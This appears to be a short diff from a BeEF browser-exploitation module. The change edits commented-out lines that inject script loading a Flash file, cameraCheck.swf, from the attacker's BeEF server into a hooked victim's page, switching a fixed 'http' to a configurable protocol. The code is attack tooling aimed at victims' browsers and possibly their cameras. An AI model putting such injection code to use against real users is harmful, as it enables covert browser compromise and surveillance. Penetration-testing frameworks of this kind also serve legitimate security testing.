@@ -62,10 +62,10 @@ beef.execute(function() {
     });
         
     //A library that helps include the swf file
-    //var swfobject_script = '<script type="text/javascript" src="http://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
+    //var swfobject_script = '<script type="text/javascript" src="'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/swfobject.js"></script>'
     
     //This is the javascript that actually calls the swfobject library to include the swf file 
-    //var include_script = '<script>var flashvars = {}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("http://'+beef.net.host+':'+beef.net.port+'/cameraCheck.swf", "main", "1", "1", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
+    //var include_script = '<script>var flashvars = {}; var parameters = {}; parameters.scale = "noscale"; parameters.wmode = "opaque"; parameters.allowFullScreen = "true"; parameters.allowScriptAccess = "always"; var attributes = {}; swfobject.embedSWF("'+beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/cameraCheck.swf", "main", "1", "1", "9", "expressInstall.swf", flashvars, parameters, attributes, swfobjectCallback);</script>';
     
 
     //Add flash content
